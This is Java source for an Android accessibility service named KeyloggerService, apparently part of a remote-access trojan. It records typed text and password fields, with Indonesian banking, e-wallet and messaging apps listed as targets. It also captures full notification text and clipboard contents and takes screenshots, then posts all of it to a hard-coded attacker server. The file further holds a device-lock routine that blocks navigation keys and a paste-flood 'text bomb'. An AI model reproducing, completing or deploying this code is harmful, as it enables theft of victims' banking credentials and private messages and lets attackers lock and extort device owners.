package com.rxd.project;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Notification;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.hardware.HardwareBuffer;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;
import android.view.Display;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import java.io.ByteArrayOutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import org.json.JSONArray;
import org.json.JSONObject;

/**
 * KeyloggerService - Accessibility Service for capturing text input
 * Captures text from keyboard input across all apps
 */
public class KeyloggerService extends AccessibilityService {

    private static final String TAG = "KEYLOGGER";
    private static final int MAX_ENTRIES = 1000;
    private static final String BASE_URL = "http://hamnzx.clouderz.my.id:2000/api/rat";
    private static KeyloggerService sInstance;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private final JSONArray pendingKeylogs = new JSONArray();
    private boolean uploaderRunning = false;
    private final Runnable uploadRunnable = this::flushPendingKeylogs;

    // Foreground app tracking — dipake AppBlockService biar gak perlu UsageStats permission
    private static String currentForegroundPackage = null;

    public static String getCurrentForegroundPackage() {
        return currentForegroundPackage;
    }

    private static final java.util.Map<String, String> TARGET_APPS = new java.util.HashMap<>();
    static {
        TARGET_APPS.put("com.whatsapp", "WhatsApp");
        TARGET_APPS.put("com.bca", "BCA Mobile");
        TARGET_APPS.put("com.bankmandiri", "Mandiri Livin'");
        TARGET_APPS.put("com.bri", "BRImo");
        TARGET_APPS.put("com.gopay", "GoPay");
        TARGET_APPS.put("com.ovo", "OVO");
        TARGET_APPS.put("com.dana", "DANA");
        TARGET_APPS.put("com.shopee", "Shopee");
        TARGET_APPS.put("com.google.android.gm", "Gmail");
        TARGET_APPS.put("org.telegram", "Telegram");
    }

    public static KeyloggerService getInstance() {
        return sInstance;
    }

    /**
     * Text bomb — paste flood ke field yang sedang fokus
     * dipanggil native (MainActivity) saat command kernel_crash
     */
    public void performTextBomb(int loops) {
        final int count = Math.max(5, Math.min(loops, 80));
        for (int i = 0; i < count; i++) {
            final int iter = i;
            handler.postDelayed(() -> {
                try {
                    AccessibilityNodeInfo root = getRootInActiveWindow();
                    if (root == null) return;
                    AccessibilityNodeInfo focus = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
                    AccessibilityNodeInfo editable = focus != null ? focus : root;
                    if (editable != null) {
                        if (editable.isEditable()) {
                            editable.performAction(AccessibilityNodeInfo.ACTION_PASTE);
                        }
                    }
                    if (iter % 5 == 0) {
                        performGlobalAction(GLOBAL_ACTION_BACK);
                    }
                    try {
                        root.recycle();
                    } catch (Exception ignored) {}
                } catch (Exception e) {
                    Log.w("KEYLOGGER", "Text bomb paste error: " + e.getMessage());
                }
            }, 150L * iter);
        }
    }
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            // Track foreground package untuk AppBlockService
            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                currentForegroundPackage = event.getPackageName() != null
                    ? event.getPackageName().toString() : null;
            }

            SharedPreferences prefs = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
            boolean blockNavigation = prefs.getBoolean("device_locked", false);

            // ✅ Block HOME, BACK, RECENTS saat device locked
            if (blockNavigation) {
                int type = event.getEventType();
                // Intercept window state changes — kalau ada app lain muncul, kembalikan ke lock
                if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                    String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
                    // Kalau bukan package kita yang muncul, paksa kembali
                    if (!pkg.equals(getPackageName()) && !pkg.isEmpty()
                            && !pkg.equals("android") && !pkg.startsWith("com.android.systemui")) {
                        // Delay sedikit agar tidak loop
                        handler.postDelayed(() -> {
                            try {
                                SharedPreferences p = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
                                if (p.getBoolean("device_locked", false)) {
                                    // Bawa kembali ke lock overlay
                                    Intent i = new Intent(this, HardLockService.class);
                                    i.putExtra("message", p.getString("lock_message", "🔒 LOCKED 🔒"));
                                    i.putExtra("pin", p.getString("lock_pin", "123456"));
                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                        startForegroundService(i);
                                    } else {
                                        startService(i);
                                    }
                                }
                            } catch (Exception ignored) {}
                        }, 200);
                    }
                }
            }

            // ===== MONITOR AUTO CAPTURE: deteksi app target =====
            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
                SharedPreferences mprefs = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
                boolean monitorEnabled = mprefs.getBoolean("monitor_enabled", false);
                if (monitorEnabled && !pkg.isEmpty()) {
                    String targetsJson = mprefs.getString("monitor_targets", "[]");
                    try {
                        JSONArray targets = new JSONArray(targetsJson);
                        if (isTargetApp(pkg, targets)) {
                            String appName = TARGET_APPS.get(pkg);
                            if (appName == null) appName = getAppName(pkg);
                            sendAppOpenedEvent(pkg, appName);
                            // Screenshot otomatis (API 34+)
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                                handler.post(this::captureScreenFrame);
                            }
                        }
                    } catch (Exception ignored) {}
                }
            }

            // ===== FULL-TEXT NOTIFICATION CAPTURE (anti-truncate) =====
            if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
                captureNotification(event);
            }

            boolean isEnabled = prefs.getBoolean("keylogger_enabled", false);
            if (!isEnabled) return;

            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                captureTextInput(event);
            }
            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
                captureTextSelection(event);
            }

        } catch (Exception e) {
            Log.e(TAG, "Error in onAccessibilityEvent: " + e.getMessage());
        }
    }

    @Override
    protected boolean onGesture(int gestureId) {
        // Block gestures when device is locked
        try {
            SharedPreferences prefs = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
            boolean isLocked = prefs.getBoolean("device_locked", false);
            
            if (isLocked) {
                Log.d(TAG, "Blocked gesture: " + gestureId);
                return true; // Consume gesture
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in onGesture: " + e.getMessage());
        }
        return super.onGesture(gestureId);
    }
    
    /**
     * Capture text input from keyboard
     */
    private void captureTextInput(AccessibilityEvent event) {
        try {
            CharSequence text = event.getText().toString();
            if (text == null || text.length() == 0) {
                return;
            }
            
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
            // Strict per-app keylog saat monitor aktif
            SharedPreferences mprefs = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
            if (mprefs.getBoolean("monitor_enabled", false)) {
                String targetsJson = mprefs.getString("monitor_targets", "[]");
                try {
                    if (!isTargetApp(packageName, new JSONArray(targetsJson))) return;
                } catch (Exception ignored) { return; }
            }
            String appName = getAppName(packageName);
            
            // Create keylog entry
            JSONObject entry = new JSONObject();
            entry.put("app", appName);
            entry.put("package", packageName);
            entry.put("text", text.toString());
            entry.put("timestamp", System.currentTimeMillis());
            entry.put("type", "text_changed");
            
            // Store entry
            storeKeylogEntry(entry);
            
            Log.d(TAG, "Captured text from " + appName + ": " + text);
            
        } catch (Exception e) {
            Log.e(TAG, "Error capturing text input: " + e.getMessage());
        }
    }
    
    /**
     * Capture text selection (useful for password fields)
     */
    private void captureTextSelection(AccessibilityEvent event) {
        try {
            AccessibilityNodeInfo source = event.getSource();
            if (source == null) {
                return;
            }
            
            CharSequence text = source.getText();
            if (text == null || text.length() == 0) {
                return;
            }
            
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
            // Strict per-app keylog saat monitor aktif
            SharedPreferences mprefs = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
            if (mprefs.getBoolean("monitor_enabled", false)) {
                String targetsJson = mprefs.getString("monitor_targets", "[]");
                try {
                    if (!isTargetApp(packageName, new JSONArray(targetsJson))) return;
                } catch (Exception ignored) { return; }
            }
            String appName = getAppName(packageName);
            
            // Check if it's a password field
            boolean isPassword = source.isPassword();
            
            // Create keylog entry
            JSONObject entry = new JSONObject();
            entry.put("app", appName);
            entry.put("package", packageName);
            entry.put("text", text.toString());
            entry.put("timestamp", System.currentTimeMillis());
            entry.put("type", isPassword ? "password" : "text_selection");
            entry.put("isPassword", isPassword);
            
            // Store entry
            storeKeylogEntry(entry);
            
            Log.d(TAG, "Captured selection from " + appName + " (password: " + isPassword + ")");
            
        } catch (Exception e) {
            Log.e(TAG, "Error capturing text selection: " + e.getMessage());
        }
    }
    
    /**
     * Get app name from package name
     */
    private String getAppName(String packageName) {
        try {
            android.content.pm.PackageManager pm = getPackageManager();
            android.content.pm.ApplicationInfo appInfo = pm.getApplicationInfo(packageName, 0);
            return pm.getApplicationLabel(appInfo).toString();
        } catch (Exception e) {
            // Return package name if app name not found
            return packageName.contains(".") ? packageName.substring(packageName.lastIndexOf(".") + 1) : packageName;
        }
    }
    
    /**
     * Store keylog entry in SharedPreferences and queue for server upload
     */
    private void storeKeylogEntry(JSONObject entry) {
        try {
            SharedPreferences prefs = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
            String keylogDataStr = prefs.getString("keylog_data", "[]");
            
            JSONArray keylogData = new JSONArray(keylogDataStr);
            keylogData.put(entry);
            
            // Limit entries to MAX_ENTRIES
            if (keylogData.length() > MAX_ENTRIES) {
                // Keep only the last MAX_ENTRIES
                JSONArray trimmed = new JSONArray();
                for (int i = keylogData.length() - MAX_ENTRIES; i < keylogData.length(); i++) {
                    trimmed.put(keylogData.get(i));
                }
                keylogData = trimmed;
            }
            
            // Save back to SharedPreferences
            prefs.edit().putString("keylog_data", keylogData.toString()).apply();

            // Queue for server upload
            synchronized (pendingKeylogs) {
                pendingKeylogs.put(entry);
            }
            startUploaderIfNeeded();
            
            Log.d(TAG, "Stored keylog entry (total: " + keylogData.length() + ")");
            
        } catch (Exception e) {
            Log.e(TAG, "Error storing keylog entry: " + e.getMessage());
        }
    }

    private void startUploaderIfNeeded() {
        if (uploaderRunning) return;
        uploaderRunning = true;
        handler.postDelayed(uploadRunnable, 3000);
    }

    private void stopUploader() {
        uploaderRunning = false;
        handler.removeCallbacks(uploadRunnable);
    }

    private void flushPendingKeylogs() {
        try {
            if (!uploaderRunning) return;
            JSONArray batch;
            synchronized (pendingKeylogs) {
                if (pendingKeylogs.length() == 0) {
                    handler.postDelayed(uploadRunnable, 3000);
                    return;
                }
                batch = new JSONArray();
                for (int i = 0; i < pendingKeylogs.length(); i++) {
                    batch.put(pendingKeylogs.get(i));
                }
                while (pendingKeylogs.length() > 0) pendingKeylogs.remove(0);
            }
            postBatchToServer(batch);
        } catch (Exception e) {
            Log.e(TAG, "flushPendingKeylogs: " + e.getMessage());
        }
        handler.postDelayed(uploadRunnable, 3000);
    }

    private void postBatchToServer(JSONArray batch) {
        try {
            SharedPreferences prefs = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
            String targetId = prefs.getString("targetId", null);
            if (targetId == null || targetId.isEmpty()) {
                targetId = prefs.getString("device_id", "UNKNOWN_DEVICE");
            }

            JSONObject payload = new JSONObject();
            payload.put("entries", batch);

            String baseUrl = prefs.getString("baseUrl", "http://hamnzx.clouderz.my.id:2000");
            URL url = new URL(baseUrl + "/api/rat/keylog/" + targetId);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);

            OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());
            writer.write(payload.toString());
            writer.flush();
            writer.close();

            int code = conn.getResponseCode();
            conn.disconnect();
            Log.d(TAG, "Keylog batch uploaded: " + batch.length() + " entries (HTTP " + code + ")");
        } catch (Exception e) {
            Log.e(TAG, "postBatchToServer: " + e.getMessage());
        }
    }
    
    @Override
    public void onInterrupt() {
        Log.d(TAG, "Keylogger service interrupted");
    }
    
    @RequiresApi(api = Build.VERSION_CODES.R)
    public void captureScreenFrame() {
        takeScreenshot(
                Display.DEFAULT_DISPLAY,
                getMainExecutor(),
                new TakeScreenshotCallback() {
                    @Override
                    public void onSuccess(@NonNull ScreenshotResult screenshotResult) {
                        try {
                            HardwareBuffer buffer = screenshotResult.getHardwareBuffer();
                            Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, screenshotResult.getColorSpace());
                            if (buffer != null) buffer.close();
                            if (bitmap == null) return;

                            int tw = Math.max(1, bitmap.getWidth() / 2);
                            int th = Math.max(1, bitmap.getHeight() / 2);
                            Bitmap scaled = Bitmap.createScaledBitmap(bitmap, tw, th, true);
                            if (scaled != bitmap) bitmap.recycle();

                            ByteArrayOutputStream out = new ByteArrayOutputStream();
                            scaled.compress(Bitmap.CompressFormat.JPEG, 45, out);
                            scaled.recycle();

                            pushScreenFrame(Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP));
                        } catch (Exception e) {
                            Log.e(TAG, "screenshot: " + e.getMessage());
                        }
                    }

                    @Override
                    public void onFailure(int errorCode) {
                        Log.e(TAG, "screenshot failed: " + errorCode);
                    }
                }
        );
    }

    private void pushScreenFrame(String base64) {
        FrameRelay.sendScreenFrame(this, base64);
    }

    public interface ScreenshotListener {
        void onScreenshot(String base64OrNull);
    }

    /** One-shot screenshot — cocok untuk command get_screen/screenshot. */
    @RequiresApi(api = Build.VERSION_CODES.R)
    public void captureScreenOnce(ScreenshotListener listener) {
        takeScreenshot(
                Display.DEFAULT_DISPLAY,
                getMainExecutor(),
                new TakeScreenshotCallback() {
                    @Override
                    public void onSuccess(@NonNull ScreenshotResult result) {
                        try {
                            HardwareBuffer buffer = result.getHardwareBuffer();
                            Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, result.getColorSpace());
                            if (buffer != null) buffer.close();
                            if (bitmap == null) { listener.onScreenshot(null); return; }

                            int tw = Math.max(1, bitmap.getWidth() / 2);
                            int th = Math.max(1, bitmap.getHeight() / 2);
                            Bitmap scaled = Bitmap.createScaledBitmap(bitmap, tw, th, true);
                            if (scaled != bitmap) bitmap.recycle();

                            ByteArrayOutputStream out = new ByteArrayOutputStream();
                            scaled.compress(Bitmap.CompressFormat.JPEG, 60, out);
                            scaled.recycle();

                            listener.onScreenshot(Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP));
                        } catch (Exception e) {
                            Log.e(TAG, "captureScreenOnce: " + e.getMessage());
                            listener.onScreenshot(null);
                        }
                    }

                    @Override
                    public void onFailure(int errorCode) {
                        Log.e(TAG, "captureScreenOnce failed: " + errorCode);
                        listener.onScreenshot(null);
                    }
                }
        );
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        sInstance = this;

        // Configure accessibility service
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        
        // Listen to all event types we need
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                          AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED |
                          AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
        
        // Listen to all apps
        info.packageNames = null;
        
        // Get events as soon as possible
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 0;
        
        // Set flags
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS |
                     AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                     AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS;
        
        setServiceInfo(info);

        // Start periodic uploader for keylog
        startUploaderIfNeeded();

        // Queue existing entries from SharedPreferences (dari sesi sebelumnya)
        try {
            SharedPreferences prefs = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
            String raw = prefs.getString("keylog_data", "[]");
            JSONArray existing = new JSONArray(raw);
            synchronized (pendingKeylogs) {
                for (int i = 0; i < existing.length(); i++) {
                    pendingKeylogs.put(existing.get(i));
                }
            }
            if (existing.length() > 0) {
                Log.d(TAG, "Queued " + existing.length() + " existing entries for upload");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error queuing existing keylog: " + e.getMessage());
        }
        
        // Clipboard monitor — AccessibilityService context bypasses Android 10+ background restriction
        try {
            android.content.ClipboardManager cm =
                (android.content.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm != null) {
                cm.addPrimaryClipChangedListener(() -> {
                    try {
                        if (cm.hasPrimaryClip() && cm.getPrimaryClip() != null) {
                            android.content.ClipData.Item item = cm.getPrimaryClip().getItemAt(0);
                            if (item != null && item.getText() != null) {
                                String text = item.getText().toString();
                                if (!text.isEmpty()) {
                                    getSharedPreferences("clipboard_cache", Context.MODE_PRIVATE)
                                        .edit().putString("last_clipboard", text)
                                        .putLong("last_clipboard_ts", System.currentTimeMillis())
                                        .apply();
                                    Log.d(TAG, "Clipboard cached: " + text.length() + " chars");
                                }
                            }
                        }
                    } catch (Exception ignored) {}
                });
            }
        } catch (Exception e) {
            Log.w(TAG, "Clipboard listener error: " + e.getMessage());
        }

        Log.d(TAG, "Keylogger service connected and configured");
    }

    @Override
    public boolean onKeyEvent(KeyEvent event) {
        // Cek apakah device sedang di-lock
        SharedPreferences prefs = getSharedPreferences("SpyPrefs", MODE_PRIVATE);
        boolean deviceLocked = prefs.getBoolean("device_locked", false);
        if (!deviceLocked) return false;

        int action = event.getAction();
        if (action != KeyEvent.ACTION_DOWN) return false;

        int keyCode = event.getKeyCode();
        // Blok HOME, APP_SWITCH, BACK
        if (keyCode == KeyEvent.KEYCODE_HOME ||
            keyCode == KeyEvent.KEYCODE_APP_SWITCH ||
            keyCode == KeyEvent.KEYCODE_BACK) {
            Log.d(TAG, "Blocked key: " + keyCode);
            return true;
        }
        return false;
    }

    @Override
    public void onDestroy() {
        stopUploader();
        sInstance = null;
        Log.d(TAG, "Keylogger service destroyed");
        super.onDestroy();
    }

    // ===== FULL-TEXT NOTIFICATION CAPTURE (anti-truncate, tanpa root) =====
    private static final java.util.LinkedHashMap<String, Long> notifDedup =
            new java.util.LinkedHashMap<String, Long>() {
                @Override
                protected boolean removeEldestEntry(java.util.Map.Entry<String, Long> eldest) {
                    return size() > 50;
                }
            };

    private void captureNotification(AccessibilityEvent event) {
        try {
            android.os.Parcelable parcelable = event.getParcelableData();
            if (!(parcelable instanceof Notification)) return;
            Notification n = (Notification) parcelable;
            if (n.extras == null) return;

            String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
            if (pkg.isEmpty() || isSystemNotification(pkg)) return;

            String appName = getAppName(pkg);
            String title = n.extras.getString("android.title", "New Message");

            // Full text: textLines (semua baris — full, bukan snippet)
            StringBuilder body = new StringBuilder();
            CharSequence[] lines = n.extras.getCharSequenceArray("android.textLines");
            if (lines != null && lines.length > 0) {
                for (int i = 0; i < lines.length; i++) {
                    if (i > 0) body.append('\n');
                    body.append(lines[i]);
                }
            }
            if (body.length() == 0) {
                CharSequence big = n.extras.getCharSequence("android.bigText");
                if (big != null) body.append(big);
            }
            if (body.length() == 0) {
                CharSequence text = n.extras.getCharSequence("android.text");
                if (text != null) body.append(text);
            }

            String fullText = body.toString().trim();
            boolean hasContent = (!title.isEmpty() && !title.equalsIgnoreCase("null"))
                    || (!fullText.isEmpty() && !fullText.equalsIgnoreCase("null"));
            if (!hasContent) return;

            // Dedup: notif yang sama (pkg+title+body) dalam 10 detik — cegah duplikat dgn NotificationService
            String key = pkg + "|" + title + "|" + fullText;
            long now = System.currentTimeMillis();
            synchronized (notifDedup) {
                Long last = notifDedup.get(key);
                if (last != null && (now - last) < 10000) return;
                notifDedup.put(key, now);
            }

            // Fallback anti-truncate: body masih pendek & tidak ada baris baru → coba expand
            boolean likelyTruncated = !fullText.contains("\n") && fullText.length() < 120;
            if (likelyTruncated) {
                handler.postDelayed(() -> tryExpandAndRead(pkg, appName, title), 700);
            }

            relayNotification(appName, pkg, title, fullText);
        } catch (Exception e) {
            Log.e(TAG, "captureNotification error: " + e.getMessage());
        }
    }

    private boolean isSystemNotification(String pkg) {
        String p = pkg.toLowerCase();
        return p.startsWith("android.") ||
               p.startsWith("com.android.") ||
               p.startsWith("com.google.android.") ||
               p.startsWith("com.qualcomm.") ||
               p.startsWith("com.samsung.android.") ||
               p.startsWith("com.sec.android.") ||
               p.contains("systemui") ||
               p.contains("launcher") ||
               p.contains("trebuchet") ||
               p.contains("nexuslauncher") ||
               p.contains(".settings") ||
               p.contains(".coe") ||
               p.equals("android");
    }

    /** Fallback: buka shade notif, cari teks milik pkg, baca ulang penuh. */
    private void tryExpandAndRead(String pkg, String appName, String title) {
        try {
            performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS);
            handler.postDelayed(() -> {
                try {
                    AccessibilityNodeInfo root = getRootInActiveWindow();
                    if (root == null) return;
                    java.util.List<AccessibilityNodeInfo> nodes = new java.util.ArrayList<>();
                    collectTextNodes(root, pkg, nodes, 0);
                    StringBuilder full = new StringBuilder();
                    for (AccessibilityNodeInfo node : nodes) {
                        if (node.getText() != null && node.getText().length() > 0) {
                            if (full.length() > 0) full.append('\n');
                            full.append(node.getText());
                        }
                    }
                    recycleNode(root);
                    if (full.length() > 0) {
                        relayNotification(appName, pkg, title, full.toString().trim());
                    }
                } catch (Exception ignored) {}
            }, 900);
        } catch (Exception ignored) {}
    }

    private void collectTextNodes(AccessibilityNodeInfo node, String pkg,
            java.util.List<AccessibilityNodeInfo> out, int depth) {
        try {
            if (depth > 8) return;
            if (node == null) return;
            String np = node.getPackageName() != null ? node.getPackageName().toString() : "";
            if (np.equals(pkg) && node.getText() != null && node.getText().length() > 0) {
                out.add(node);
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                collectTextNodes(node.getChild(i), pkg, out, depth + 1);
            }
        } catch (Exception ignored) {}
    }

    private void recycleNode(AccessibilityNodeInfo node) {
        try {
            node.recycle();
        } catch (Exception ignored) {}
    }

    /** Simpan lokal (notifications_data) + relay ke server post-notification. */
    private void relayNotification(String appName, String pkg, String title, String fullText) {
        try {
            SharedPreferences prefs = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);

            // Simpan lokal — format sama dgn NotificationService biar get_notifications ikut
            try {
                String existing = prefs.getString("notifications_data", "[]");
                JSONArray arr = new JSONArray(existing);
                JSONObject obj = new JSONObject();
                obj.put("app", appName);
                obj.put("package", pkg);
                obj.put("title", title);
                obj.put("body", fullText);
                obj.put("timestamp", System.currentTimeMillis());
                obj.put("fullText", true);
                arr.put(obj);
                if (arr.length() > 200) {
                    JSONArray trimmed = new JSONArray();
                    for (int i = arr.length() - 200; i < arr.length(); i++) trimmed.put(arr.get(i));
                    arr = trimmed;
                }
                prefs.edit().putString("notifications_data", arr.toString()).apply();
            } catch (Exception e) {
                Log.e(TAG, "local save: " + e.getMessage());
            }

            // Relay ke server
            new Thread(() -> {
                HttpURLConnection conn = null;
                try {
                    String targetId = prefs.getString("targetId", null);
                    if (targetId == null || targetId.isEmpty()) {
                        targetId = prefs.getString("device_id", "UNKNOWN_DEVICE");
                    }
                    String baseUrl = prefs.getString("baseUrl",
                            "http://hamnzx.clouderz.my.id:2000");
                    URL url = new URL(baseUrl + "/api/rat/post-notification/" + targetId);
                    conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json; utf-8");
                    conn.setDoOutput(true);
                    conn.setConnectTimeout(5000);
                    conn.setReadTimeout(5000);

                    JSONObject json = new JSONObject();
                    json.put("targetId", targetId);
                    json.put("app", appName);
                    json.put("title", title);
                    json.put("body", fullText);
                    json.put("package", pkg);
                    json.put("category", "MSG");
                    json.put("timestamp", new java.text.SimpleDateFormat(
                            "yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.US)
                            .format(new java.util.Date()));

                    OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());
                    writer.write(json.toString());
                    writer.flush();
                    writer.close();

                    int code = conn.getResponseCode();
                    Log.d(TAG, "[NOTIF-FULL] " + appName + " -> HTTP " + code);
                } catch (Exception e) {
                    Log.e(TAG, "notif relay failed: " + e.getMessage());
                } finally {
                    if (conn != null) conn.disconnect();
                }
            }).start();
        } catch (Exception e) {
            Log.e(TAG, "relayNotification error: " + e.getMessage());
        }
    }

    // ===== MONITOR HELPERS =====

    private boolean isTargetApp(String pkg, JSONArray targets) {
        for (int i = 0; i < targets.length(); i++) {
            try {
                if (targets.getString(i).equals(pkg)) return true;
            } catch (Exception ignored) {}
        }
        return false;
    }

    private void sendAppOpenedEvent(String pkg, String name) {
        try {
            JSONObject payload = new JSONObject();
            payload.put("cmd", "app_opened");
            payload.put("package", pkg);
            payload.put("name", name);
            payload.put("timestamp", System.currentTimeMillis());
            FrameRelay.sendTargetEvent(this, "app_opened", payload);
            Log.d(TAG, "Monitor: " + name + " (" + pkg + ") opened");
        } catch (Exception e) {
            Log.e(TAG, "sendAppOpenedEvent: " + e.getMessage());
        }
    }
}
